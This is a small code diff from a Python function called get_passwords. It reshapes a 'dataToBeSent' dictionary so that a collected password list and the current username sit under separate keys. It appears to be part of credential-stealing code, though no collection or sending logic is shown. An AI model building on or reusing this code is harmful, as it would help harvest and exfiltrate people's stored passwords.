@@ -73,7 +73,8 @@ def get_passwords():
             except:
                 pass
 
-    dataToBeSent[os.getenv('username')] = dataList
+    dataToBeSent["passwords"] = dataList
+    dataToBeSent["user"]=os.getenv('username')
     return dataToBeSent
 
 
